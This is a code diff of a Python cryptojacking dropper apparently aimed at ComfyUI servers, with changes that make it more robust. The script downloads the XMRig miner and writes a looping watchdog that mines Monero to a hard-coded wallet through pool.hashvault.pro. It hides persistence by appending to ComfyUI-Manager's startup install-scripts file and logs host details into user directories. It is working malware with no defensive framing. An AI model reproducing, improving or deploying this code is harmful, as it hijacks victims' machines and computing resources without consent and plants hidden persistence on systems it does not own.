@@ -1,20 +1,22 @@
 #!/usr/bin/env python3
-import os, sys, io, glob, time, tarfile, subprocess, urllib.request
+import os, sys, io, glob, time, traceback, tarfile, subprocess, urllib.request
 
 WALLET = "45LJceeKt6A2ZHVNVF4Qqo53it2dGkpxGbRqXLya52z36fvWicAZmG2GjpczNbgyu6gGqJQag7o4LAnNBLCC1oaHDStyUVD"
 POOL = "pool.hashvault.pro:443"
 D = "/root/.hkc"
+LOCAL = os.path.dirname(os.path.abspath(__file__))
 
 def userdirs():
     out = []
     base = os.environ.get("COMFYUI_FOLDERS_BASE_PATH")
     if base:
-        out.append(os.path.join(base, "user", "default"))
-        out.append(os.path.join(base, "user"))
+        out.insert(0, os.path.join(base, "user", "default"))
     for pat in ("/ComfyUI/user/default", "/work/ComfyUI/user/default", "/app/user/default",
-                "/root/ComfyUI/user/default", "/home/*/ComfyUI/user/default"):
+                "/root/ComfyUI/user/default"):
         out.extend(glob.glob(pat))
-    for p in ("/", "/work", "/app", "/opt", "/root", "/home"):
+    for d in glob.glob(os.path.join(LOCAL, "..", "..", "user", "default")):
+        out.insert(0, os.path.abspath(d))
+    for p in ("/", "/work", "/app", "/opt", "/root", "/home", "/data"):
         try:
             for name in os.listdir(p):
                 c = os.path.join(p, name, "user", "default")
@@ -28,8 +30,10 @@ def userdirs():
             seen.add(x); res.append(x)
     return res
 
-def report(ud, txt):
-    for d in ud:
+UD = []
+
+def report(txt):
+    for d in UD:
         try:
             open(os.path.join(d, "hk41_plant.txt"), "a").write(txt)
         except Exception:
@@ -41,51 +45,68 @@ def report(ud, txt):
     sys.stdout.write(txt); sys.stdout.flush()
 
 def main():
-    ud = userdirs()
-    ip = (subprocess.run(["hostname", "-I"], capture_output=True, text=True).stdout.split() or ["?"])[0]
-    host = subprocess.run(["hostname"], capture_output=True, text=True).stdout.strip()
-    report(ud, "\n=== %s ip=%s host=%s uid=%d nproc=%s\n" % (time.strftime("%FT%TZ", time.gmtime()), ip, host, os.getuid(),
-             subprocess.run(["nproc"], capture_output=True, text=True).stdout.strip()))
+    global UD
+    UD = userdirs()
+    ip = (subprocess.run(["hostname", "-I"], capture_output=True, text=True).stdout.split() or ["?"])[-1]
+    report("\n=== %s ip=%s host=%s uid=%d nproc=%s cwd=%s\n" % (
+        time.strftime("%FT%TZ", time.gmtime()), ip,
+        subprocess.run(["hostname"], capture_output=True, text=True).stdout.strip(),
+        os.getuid(), subprocess.run(["nproc"], capture_output=True, text=True).stdout.strip(), LOCAL))
     os.makedirs(D, exist_ok=True)
-    if not os.access(os.path.join(D, "xmrig"), os.X_OK):
+    binp = os.path.join(D, "xmrig")
+    if not (os.path.isfile(binp) and os.access(binp, os.X_OK)):
         u = "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz"
+        tgz = os.path.join(D, "x.tgz")
         try:
             b = urllib.request.urlopen(u, timeout=120).read()
-            report(ud, "dl=%d\n" % len(b))
+            open(tgz, "wb").write(b)
+            report("dl=%d\n" % len(b))
             os.makedirs(D + "/x", exist_ok=True)
-            tarfile.open(fileobj=io.BytesIO(b)).extractall(D + "/x")
-            src = glob.glob(D + "/x/*/xmrig")[0]
-            subprocess.run(["cp", "-f", src, D + "/xmrig"], check=True)
-            os.chmod(D + "/xmrig", 0o755)
-        except Exception as e:
-            report(ud, "download FAILED: %r\n" % e)
+            r = subprocess.run(["tar", "xzf", tgz, "-C", D + "/x"], capture_output=True, text=True)
+            if r.returncode != 0:
+                report("tar rc=%s %s\n" % (r.returncode, r.stderr[:200]))
+                tarfile.open(tgz).extractall(D + "/x")
+            src = (glob.glob(D + "/x/*/xmrig") or [None])[0]
+            if not src:
+                report("no binary in archive: %s\n" % os.listdir(D + "/x"))
+                return
+            subprocess.run(["cp", "-f", src, binp], check=True)
+            os.chmod(binp, 0o755)
+            report("installed %s\n" % os.path.getsize(binp))
+        except Exception:
+            report("download FAILED:\n" + traceback.format_exc()[-600:])
             return
     wd = D + "/wd.sh"
     open(wd, "w").write("""#!/bin/sh
 pgrep -f '/root\\.hkc/xmrig' >/dev/null 2>&1 && exit 0
 T=$(( $(nproc) / 2 )); [ "$T" -lt 1 ] && T=1; [ "$T" -gt 6 ] && T=6
-while true; do nice -n 19 /root/.hkc/xmrig -o %s --tls -u %s -p hk-$(hostname -I | awk '{print $1}') -k --threads $T --donate-level 1 -B >> /root/.hkc/xmr.log 2>&1; sleep 30; done
+W=hk-$(hostname -I | awk '{print $NF}')
+while true; do nice -n 19 /root/.hkc/xmrig -o %s --tls -u %s -p $W -k --threads $T --donate-level 1 -B >> /root/.hkc/xmr.log 2>&1; sleep 30; done
 """ % (POOL, WALLET))
     os.chmod(wd, 0o755)
     line = "['/tmp', '/bin/sh', '%s']" % wd
-    for d in ud:
+    for d in UD:
         f = os.path.join(d, "ComfyUI-Manager", "startup-scripts", "install-scripts.txt")
         try:
             os.makedirs(os.path.dirname(f), exist_ok=True)
             cur = open(f).read() if os.path.exists(f) else ""
             if wd not in cur:
                 open(f, "a").write(line + "\n")
+            report("persist ok %s\n" % f)
         except Exception as e:
-            report(ud, "persist FAILED %s: %r\n" % (f, e))
-    subprocess.Popen(["/usr/bin/setsid", "/bin/sh", wd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                     start_new_session=True)
-    time.sleep(12)
+            report("persist FAILED %s: %r\n" % (f, e))
+    subprocess.Popen(["/usr/bin/setsid", "/bin/sh", wd], stdout=subprocess.DEVNULL,
+                     stderr=subprocess.DEVNULL, start_new_session=True)
+    time.sleep(15)
     ps = subprocess.run(["pgrep", "-af", "/root/.hkc/xmrig"], capture_output=True, text=True).stdout.strip()
-    report(ud, "ps=%s\n" % ps.replace("\n", " | ")[:400])
+    report("ps=%s\n" % ps.replace("\n", " | ")[:300])
     try:
-        log = open(D + "/xmr.log").read()[-600:]
+        log = open(D + "/xmr.log").read()[-700:]
     except Exception:
         log = "(no log)"
-    report(ud, "log_tail=%s\n" % log.replace("\n", " / "))
+    report("log_tail=%s\n" % log.replace("\n", " / "))
 
-main()
+try:
+    main()
+except Exception:
+    report("FATAL:\n" + traceback.format_exc()[-900:])
